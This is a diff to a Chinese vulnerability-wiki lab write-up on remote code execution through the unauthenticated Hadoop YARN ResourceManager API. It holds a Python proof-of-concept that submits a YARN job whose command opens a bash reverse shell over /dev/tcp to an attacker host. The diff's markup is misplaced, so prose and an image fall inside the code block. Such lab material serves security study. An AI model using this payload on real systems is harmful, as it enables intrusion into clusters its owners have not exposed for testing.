@@ -22,8 +22,10 @@ Vulhub运行测试环境
 
 ```
 docker-compose up -d
-```
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
 
+<pre><code class="language-text">
 环境启动后，访问`http://your-ip:8088`即可看到Hadoop YARN ResourceManager WebUI页面。
 
 ![image-20220224001542564](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/database/images/202202240015697.png)
@@ -57,13 +59,14 @@ data = {
     'application-name': 'get-shell',
     'am-container-spec': {
         'commands': {
-            'command': '/bin/bash -i >& /dev/tcp/%s/9999 0>&1' % lhost,
+            'command': '/bin/&#98;ash -i &gt;&amp; &#47;dev/tcp/%s/9999 0&gt;&amp;1' % lhost,
         },
     },
     'application-type': 'YARN',
 }
-requests.post(url, json=data)
-```
+requests.post(url, json=data)</code></pre>
+
+</details>
 
 成功反弹shell：
 
